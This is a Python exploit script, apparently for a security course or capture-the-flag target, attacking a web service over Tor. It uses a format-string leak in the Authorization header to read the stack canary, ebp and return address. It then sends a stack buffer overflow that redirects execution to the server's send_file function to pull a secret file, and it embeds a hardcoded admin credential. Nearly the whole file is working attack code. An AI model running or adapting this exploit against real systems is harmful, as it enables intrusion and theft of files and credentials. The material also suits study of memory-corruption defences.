import requests
import sys
import binascii
import subprocess


def hex_to_bin_file(hex_txt):
	"""
		Convert Hex string to binary and save it to a file
	"""
	binary_txt = binascii.unhexlify(hex_txt)
	with open("binary_data","wb") as f: f.write(binary_txt)


def change_endian(input):
	"""
		Convert a hex address to little endian
	"""
	hex_to_int = int(input, 16)
	bytes = hex_to_int.to_bytes((hex_to_int.bit_length() + 7) // 8, 'little') or b'\0'
	bytes_to_string = ''.join(format(x, '02x') for x in bytes)
	return bytes_to_string.upper()

def compute_address(reference_point, offset):
    """
        Add an offset to a hex address
            reference_point: the original hex address in which we want to apply the offset
            offset: the offset (in decimal) that we want to apply
    """
    dec_number = int(reference_point, 16)  # Convert hex to decimal
    new_address = dec_number + offset	# add the offset
    hex_new_address = hex(new_address).replace('0x','').upper() # convert back to hex
    return change_endian(hex_new_address)   # change to little endian

flag = True
while flag:
	# loop until the curl request is succesfull (due to tor sometimes the requests fail)
	# the following curl command contains a Format String Vulnerability in Authorization header
	curl_command = "curl --socks5-hostname localhost:9050 --max-time 10 --data-raw 'F' -v 'http://xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion/check_secret.html' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Content-Length: 0' -H 'Authorization: Basic JTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eA==' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache'"
	status, output = subprocess.getstatusoutput(curl_command) # execute the curl command
	lines = output.splitlines() # split the output in lines
	for line in lines:
	    if "WWW-Authenticate" in line: # find the line that contains the Authorization response header
	        flag = False
	        line = line.replace("\"","")
	        list = line.split(" ")
	        new_list = list[5:] # create a list containing all the results of the attack
	        break

canary = new_list[26] # get the canary
ebp = new_list[29]	# get the ebp address
return_address = new_list[30]	# get the return address of the function in which the attack happened
# ebp and return_address will be used in order to find new addresses based on relative offsets


buffer_offset = -136    # the offset of the buffer's address from ebp
send_file_offset = + 1651 # the offset of send_file function from ebp

# in order to achieve the attack out data should not have 00 in it (due to strcpy)
# inside post_param function (and after the strcpy) '=' and '&' are replaced with '\0'
# so we replace every '00' ('\0') occurance with '3D' ('=') in our data
canary = canary.replace('00','3D')

# the parameter that we want to pass to send_file
tt = "/secet/x".encode("utf-8").hex() # convert the string to hex
# tt = "/secet/y".encode("utf-8").hex()

tt = tt.replace('00','3D') # replace zeros
hex_data = tt # add the string to the total data (as we want to be written in the start of the buffer)
hex_data += '3D' 	# add '=' so as to "end" the string
hex_data += 'F'*(86) # fill with "junk" untill we reach the wanted offset


# write the address of buffer
hex_data += compute_address(ebp,buffer_offset) # the address of the buffer is computed with the correct offset from ebp

hex_data += 'F'*8 # write one random word

hex_data += change_endian(canary) # write the canary

hex_data += 'F'*16 # write two random words


hex_data += change_endian(ebp) # write the ebp
# write the address of the send_file function, in order to overwrite the return address and be called
hex_data += compute_address(return_address,send_file_offset)  # the address of send_file is computed with the correct offset from return_address that we gained from the attack
# write the address of the buffer (not actually used)
hex_data += compute_address(ebp,buffer_offset)
# write the address of the buffer in order to be passed as parameter (char *) to send_file function and read the string from the buffer
hex_data += compute_address(ebp,buffer_offset)

# convert the Hex data into binary
hex_to_bin_file(hex_data)

# the curl request that will execute the attack. Our data are passed from the binary file that was just created
curl = "curl --socks5-hostname localhost:9050 --max-time 10 --data-binary '@binary_data' -v 'http://xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion/check_secret.html' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Content-Length: 0' -H 'Authorization: Basic YWRtaW46aGFtbWVydGltZQ==' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache'"

# some times the request fails, so repeat until it is successfull
# some known errors
errors = ["with 0 bytes received","Empty reply from server","Failed to receive SOCKS5 connect request ack","Can't complete SOCKS5 connection","Bad Gateway"]
flag = True
while flag:
	status, output = subprocess.getstatusoutput(curl) # execute curl request
	flag = False
	for error in errors: # check if the request was succesfull
            if error in output:
                flag = True

print("\n/* OUTPUT */\n")
print(output)
